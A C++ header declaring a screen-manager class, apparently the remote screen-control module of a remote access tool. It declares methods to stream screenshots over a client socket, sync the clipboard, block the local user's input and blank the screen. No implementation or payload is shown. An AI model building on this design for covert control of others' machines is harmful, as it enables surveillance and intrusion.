// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__A471761B_2C02_4225_9F3E_4C030581F27D__INCLUDED_)
#define AFX_SCREENMANAGER_H__A471761B_2C02_4225_9F3E_4C030581F27D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
#include "ScreenSpy.h"

class CScreenManager : public CManager    
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	void QuickenScreen();
	BOOL IsConnect();
	int	GetCurrentPixelBits();
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;
	BOOL m_bIsBlankScreen;
private:
	BYTE	m_bAlgorithm;
	BOOL	m_bIsCaptureLayer;
	int	m_biBitCount;
	HANDLE	m_hWorkThread, m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy	*m_pScreenSpy;
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	ControlThread(LPVOID lparam);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	HRESULT DisableAeroTheme(BOOL bStatus);
	HMODULE dwmapiDllHandle;

};

#endif // !defined(AFX_SCREENMANAGER_H__A471761B_2C02_4225_9F3E_4C030581F27D__INCLUDED_)
